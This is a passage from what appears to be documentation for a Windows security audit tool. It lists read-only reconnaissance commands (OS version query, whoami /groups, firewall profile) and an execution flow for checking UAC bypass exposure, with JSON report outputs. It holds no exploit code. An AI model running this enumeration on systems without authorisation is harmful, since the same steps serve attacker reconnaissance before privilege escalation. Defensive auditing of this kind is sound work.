        3. `powershell -Command "Get-WmiObject Win32_OperatingSystem | Select-Object Version"` (OS Version Check)
        4. `whoami /groups` (Current Group Context)
        5. `netsh advfirewall show currentprofile` (Firewall Profile)
    - **Execution Flow**: Policy Check -> UAC Audit -> OS Version -> Group Context -> Firewall Profile.
    - **Output Generation & Artifacts**:
        - `reports/outputs/AUDIT_[Timestamp]_uac_vulnerability.json`: Status of UAC bypass vulnerabilities.
        - `reports/analysis/AUDIT_[Timestamp]_uac_context.json`: UAC settings and environment context.

---

**© 2026 Funbinet Inc. — JABBER V 5.5.0.0**

---
